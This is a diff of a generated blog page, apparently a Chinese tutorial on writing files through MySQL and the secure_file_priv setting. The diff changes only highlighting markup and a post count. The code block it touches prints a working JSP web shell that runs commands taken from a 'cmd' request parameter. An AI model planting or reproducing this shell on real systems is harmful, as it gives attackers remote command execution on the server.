@@ -419,7 +419,7 @@
 <p>注意，写入的文件不能已经存在，否则会提示:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1086 (HY000): File &apos;/tmp/test.jsp&apos; already exists</div></pre></td></tr></table></figure>
 <p>查看下写入的<em>test.jsp</em>文件内容：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> cat /tmp/test.jsp</div><div class="line">1234&lt;%@ page contentType="text/html; charset=GBK" %&gt;</div><div class="line">&lt;%@ page import="java.io.*" %&gt; &lt;% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) &#123; String s = null; try &#123; Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) &#123; output += s +"\r\n"; &#125; &#125; catch(IOException e) &#123; e.printStackTrace(); &#125; &#125;</div><div class="line">out.println(output);%&gt;%</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /tmp/test.jsp</span></div><div class="line">1234&lt;%@ page contentType="text/html; charset=GBK" %&gt;</div><div class="line">&lt;%@ page import="java.io.*" %&gt; &lt;% String cmd = request.getParameter("cmd"); String output = ""; if(cmd != null) &#123; String s = null; try &#123; Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) &#123; output += s +"\r\n"; &#125; &#125; catch(IOException e) &#123; e.printStackTrace(); &#125; &#125;</div><div class="line">out.println(output);%&gt;%</div></pre></td></tr></table></figure>
 <p>参考：</p>
 <p><a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv" target="_blank" rel="external">sysvar_secure_file_priv</a></p>
 
@@ -539,7 +539,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
